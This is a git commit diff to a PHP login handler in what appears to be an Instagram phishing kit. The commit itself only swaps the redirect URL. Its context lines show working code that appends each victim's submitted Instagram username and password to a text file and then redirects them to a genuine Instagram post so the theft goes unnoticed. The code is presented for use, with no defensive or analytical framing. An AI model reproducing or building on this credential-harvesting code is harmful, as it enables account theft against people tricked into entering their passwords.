bf5ab35b54d6f48333126814f809b1669c5390f9
omrajpal13274 <92999504+omrajpal13274@users.noreply.github.com>
2022-11-27 04:00:22 -0500

    Update login.php

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,6 +1,6 @@
 <?php
 
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://www.instagram.com/p/Cg9cdfcJhlR/?igshid=YmMyMTA2M2Y=');
+header('Location: https://www.instagram.com/p/ClG-4lHKYR9/?next=%2F');
 exit();
 ?>
